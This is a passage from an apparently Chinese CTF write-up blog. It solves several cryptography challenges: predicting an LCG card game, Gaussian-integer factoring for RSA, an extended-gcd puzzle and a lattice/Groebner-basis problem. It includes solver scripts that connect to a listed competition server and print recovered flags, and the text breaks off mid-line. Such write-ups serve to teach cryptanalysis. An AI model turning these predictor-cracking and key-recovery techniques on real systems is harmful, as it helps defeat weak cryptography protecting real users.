#  #  #  ##  ## #      </span></span><br><span class="line"><span class="string">#      #    # #    # #    #    #      #    # # ## # #####  </span></span><br><span class="line"><span class="string">#      ###### #####  #    #    #  ### ###### #    # #      </span></span><br><span class="line"><span class="string">#    # #    # #   #  #    #    #    # #    # #    # #      </span></span><br><span class="line"><span class="string"> ####  #    # #    # #####      ####  #    # #    # ######</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line"></span><br><span class="line">    meum = <span class="string">&#x27;&#x27;&#x27;option:</span></span><br><span class="line"><span class="string">    1: start game</span></span><br><span class="line"><span class="string">    2: get hint</span></span><br><span class="line"><span class="string">    3: exit</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(meum)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;input your option: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        your_input = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            n = getPrime(<span class="number">36</span>)</span><br><span class="line">            m = getPrime(<span class="number">16</span>)</span><br><span class="line">            c = getPrime(<span class="number">16</span>)</span><br><span class="line">            seed = getPrime(<span class="number">36</span>)</span><br><span class="line">            out = seed</span><br><span class="line">            <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">            score = <span class="number">0</span></span><br><span class="line">            res = []</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">                res = []</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;round:<span class="subst">&#123;<span class="built_in">round</span>&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;score:<span class="subst">&#123;score&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">3</span>):</span><br><span class="line">                    out = (out*m+c)%n</span><br><span class="line">                    res.append(out)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">round</span> == <span class="number">1</span>:</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">round</span>==<span class="number">2</span> <span class="keyword">or</span> <span class="built_in">round</span>==<span class="number">3</span>:  <span class="comment">#gift</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">                        card, suit = choose_card(i)</span><br><span class="line">                        <span class="built_in">print</span>(card)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;gift: <span class="subst">&#123;res&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cards = []</span><br><span class="line">                    suits = []</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">                        card, suit = choose_card(res[i])</span><br><span class="line">                        cards.append(card)</span><br><span class="line">                        suits.append(suit)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Give me your guess: (example: Heart_1 Club_2 Diamond_3)&quot;</span>)  </span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        g_1, g_2, g_3 = <span class="built_in">input</span>().split()</span><br><span class="line">                        g_1, g_2, g_3 = g_1.split(<span class="string">&#x27;_&#x27;</span>), g_2.split(<span class="string">&#x27;_&#x27;</span>), g_3.split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">                    <span class="keyword">except</span> ValueError:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Please enter in the correct format.&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                    <span class="keyword">if</span> (g_1[<span class="number">0</span>] == suits[<span class="number">0</span>] <span class="keyword">and</span> g_1[<span class="number">1</span>] == cards[<span class="number">0</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_2[<span class="number">0</span>] == suits[<span class="number">1</span>] <span class="keyword">and</span> g_2[<span class="number">1</span>] == cards[<span class="number">1</span>][<span class="number">15</span>]) <span class="keyword">and</span> (g_3[<span class="number">0</span>] == suits[<span class="number">2</span>] <span class="keyword">and</span> g_3[<span class="number">1</span>] == cards[<span class="number">2</span>][<span class="number">15</span>]):</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You matched the cards!&quot;</span>)</span><br><span class="line">                        score += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> cards:</span><br><span class="line">                            <span class="built_in">print</span>(i)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;Try again!&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> score == <span class="number">50</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;The flag is your reward!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Have you ever heard of LCG?&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> your_input == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    GAME()</span><br></pre></td></tr></table></figure></blockquote><p>代码逻辑本质是LCG，有个坑点，比对的时候，10是0。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_card</span>(<span class="params">num</span>):</span><br><span class="line">    x = (num&gt;&gt;<span class="number">5</span>)%<span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Heart&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Spade&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> x%<span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Diamond&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (num&gt;&gt;<span class="number">6</span>)%<span class="number">13</span>, <span class="string">&#x27;Club&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">4953</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;option: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">seq = []</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift: &#x27;</span>)</span><br><span class="line">seq += <span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(seq)</span><br><span class="line"></span><br><span class="line">n, m, c = crack_unknown_modulus(seq)</span><br><span class="line"><span class="built_in">print</span>((n,m,c))</span><br><span class="line"></span><br><span class="line">out = seq[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="built_in">next</span> = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        out = (out*m+c)%n</span><br><span class="line">        card,suit = choose_card(out)</span><br><span class="line">        real_card = <span class="built_in">str</span>(card+<span class="number">1</span>).replace(<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&#x27;11&#x27;</span>,<span class="string">&#x27;J&#x27;</span>).replace(<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>).replace(<span class="string">&#x27;13&#x27;</span>,<span class="string">&#x27;K&#x27;</span>).replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="built_in">next</span>.append(<span class="string">f&#x27;<span class="subst">&#123;suit&#125;</span>_<span class="subst">&#123;real_card&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">next</span> = <span class="string">b&#x27; &#x27;</span>.join(<span class="built_in">next</span>)</span><br><span class="line">    <span class="built_in">print</span>(k,<span class="built_in">next</span>)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;(example: Heart_1 Club_2 Diamond_3)\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">next</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.recvall().decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congratulations! You matched the cards!</span></span><br><span class="line"><span class="comment"># The flag is your reward!</span></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;lcg_a@@@@@ttack&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EzComplex"><a href="#EzComplex" class="headerlink" title="EzComplex"></a>EzComplex</h3><blockquote><p>And u, my friend: Complex factors! (In a double sense)</p></blockquote><p>高斯整数分解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">GI = GaussianIntegers()</span><br><span class="line">d = divisors(GI(N))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> d:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;I&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(k):</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.imag()))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="built_in">abs</span>(k.real()))</span><br><span class="line">        <span class="keyword">if</span> p.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(p) <span class="keyword">and</span> q.bit_length() <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">382</span>,<span class="number">385</span>) <span class="keyword">and</span> is_prime(q):</span><br><span class="line">            <span class="built_in">print</span>((p,q))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># (8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707, 29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343)</span></span><br><span class="line"><span class="comment"># (29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343, 8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707)</span></span><br></pre></td></tr></table></figure><p>再常规RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">p,q = (<span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span>, <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span>)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p*q)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ext-7gcd"><a href="#ext-7gcd" class="headerlink" title="ext^7gcd"></a>ext^7gcd</h3><blockquote><p>题目链接：nc 59.110.20.54:1789 （下sagemath! 不下的统统发配到安东星当嘿奴！）</p></blockquote><p>分析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a1*p1+a2*p2=1</span><br><span class="line">a3*p3+a4*p4=1</span><br><span class="line">a5*p5+a6*p6=1</span><br><span class="line">a0*p0+a*(a1*p1+a2*p2+a3*p3+a4*p4+a5*p5+a6*p6)=a0*p0+a*3=1</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">1789</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xgcd</span>(<span class="params">a,b</span>):</span><br><span class="line">    prevx, x = <span class="number">1</span>, <span class="number">0</span>;  prevy, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q, r = <span class="built_in">divmod</span>(a,b)</span><br><span class="line">        x, prevx = prevx - q*x, x  </span><br><span class="line">        y, prevy = prevy - q*y, y</span><br><span class="line">        a, b = b, r</span><br><span class="line">    <span class="keyword">return</span> a, prevx, prevy</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">    p = <span class="built_in">eval</span>(<span class="string">b&#x27;[&#x27;</span>+r.recvuntil(<span class="string">b&#x27;]&#x27;</span>))</span><br><span class="line">    _,a1,a2 = xgcd(p[<span class="number">1</span>],p[<span class="number">2</span>])</span><br><span class="line">    _,a3,a4 = xgcd(p[<span class="number">3</span>],p[<span class="number">4</span>])</span><br><span class="line">    _,a5,a6 = xgcd(p[<span class="number">5</span>],p[<span class="number">6</span>])</span><br><span class="line">    _,a0,a = xgcd(p[<span class="number">0</span>],<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;a6: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">f&#x27;<span class="subst">&#123;a0&#125;</span>,<span class="subst">&#123;a*a1&#125;</span>,<span class="subst">&#123;a*a2&#125;</span>,<span class="subst">&#123;a*a3&#125;</span>,<span class="subst">&#123;a*a4&#125;</span>,<span class="subst">&#123;a*a5&#125;</span>,<span class="subst">&#123;a*a6&#125;</span>&#x27;</span>.encode())</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;N0t_s0_e4sy_3xtgCd&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h3><blockquote><p>Recently jrl888 has learned something about groebner_basis.But could U plz help him to sovle his linear algebra homework?</p></blockquote><p>矩阵 <code>1*32 * 32*16 = 1*16</code>，构造格规约：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="number">76231309481023608274751321361920497941621991893430257210800219032855778863403</span></span><br><span class="line">M = [...]</span><br><span class="line">c = [...]</span><br><span class="line"></span><br><span class="line">M = matrix(ZZ, <span class="number">32</span>,<span class="number">16</span>, M)</span><br><span class="line">I = identity_matrix(<span class="number">32</span>)</span><br><span class="line">P = p * identity_matrix(<span class="number">16</span>)</span><br><span class="line">C = matrix(ZZ, c)</span><br><span class="line">Z1 = zero_matrix(<span class="number">16</span>,<span class="number">32</span>)</span><br><span class="line">Z2 = zero_matrix(<span class="number">1</span>,<span class="number">32</span>)</span><br><span class="line">L = block_matrix(ZZ,[[M,I],[P,Z1],[C,Z2]])</span><br><span class="line">B = L.LLL()</span><br><span class="line">key = <span class="built_in">list</span>(-B[<span class="number">1</span>][<span class="number">16</span>:])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [241, 234, 29, 209, 141, 236, 196, 125, 153, 121, 243, 104, 157, 250, 164, 197, 241, 85, 184, 247, 145, 27, 128, 184, 203, 233, 104, 196, 118, 255, 12, 24]</span></span><br></pre></td></tr></table></figure><p>再根据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x1^e0%p=c0</span><br><span class="line">x2^e1%p=c1</span><br><span class="line">x3^e2%p=c2</span><br><span class="line">x1+x2+x3=s</span><br><span class="line">GB基解</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">key = [<span class="number">241</span>, <span class="number">234</span>, <span class="number">29</span>, <span class="number">209</span>, <span class="number">141</span>, <span class="number">236</span>, <span class="number">196</span>, <span class="number">125</span>, <span class="number">153</span>, <span class="number">121</span>, <span class="number">243</span>, <span class="number">104</span>, <span class="number">157</span>, <span class="number">250</span>, <span class="number">164</span>, <span class="number">197</span>, <span class="number">241</span>, <span class="number">85</span>, <span class="number">184</span>, <span class="number">247</span>, <span class="number">145</span>, <span class="number">27</span>, <span class="number">128</span>, <span class="number">184</span>, <span class="number">203</span>, <span class="number">233</span>, <span class="number">104</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">12</span>, <span class="number">24</span>]</span><br><span class="line">key = <span class="built_in">int</span>(<span class="built_in">bytes</span>(key).<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line">c = [<span class="number">5415723658972576382153559473862560277755192970021711034483296770242757614573901416501357332661976379693731699836578087114136761491831672836130172409491889</span>, <span class="number">210713951733721296094981135225517096332793112439184310028590576805069783972692891743044656754643189870169698041576462365740899368554671164493356650858567594970345928936103914826926922045852943068526737627918609421198466329605091625</span>, <span class="number">93558120697660628972553751937347865465963385519812302371069578286123647411810258547153399045605149278436900736665388355004346922404097196048139360206875149390218160164739477798859206611473675859708579299466581718543909912951088772842957187413726251892347470983848602814387339449340072310561011153714207338630</span>]</span><br><span class="line">p = <span class="number">175336555462486363373099551411803174933803940918372428249159666803182759268063415863987676455854054651631174131625763475189413468427467197699058719725221879406119373683175842618465694427132003565774900609456204965408254598477034791500576573579131820364396996254469692964946065509325801687720344376041097328929</span></span><br><span class="line">s = <span class="number">192597139210277682598060185912821582569043452465684540030278464832244948354365</span></span><br><span class="line"></span><br><span class="line">P.&lt;i&gt; = PolynomialRing(ZZ)</span><br><span class="line">f = i^<span class="number">3</span> - <span class="number">10</span>*i^<span class="number">2</span> + <span class="number">31</span>*i - <span class="number">30</span></span><br><span class="line">res = f.roots()</span><br><span class="line">e = [k[<span class="number">0</span>] <span class="keyword">for</span> k <span class="keyword">in</span> res]</span><br><span class="line"></span><br><span class="line">P.&lt;x1,x2,x3&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f1 = x1^e[<span class="number">2</span>]-c[<span class="number">0</span>]</span><br><span class="line">f2 = x2^e[<span class="number">1</span>]-c[<span class="number">1</span>]</span><br><span class="line">f3 = x3^e[<span class="number">0</span>]-c[<span class="number">2</span>]</span><br><span class="line">f4 = x1+x2+x3-s</span><br><span class="line">G = Ideal([f1, f2, f3, f4]).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(G)</span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span 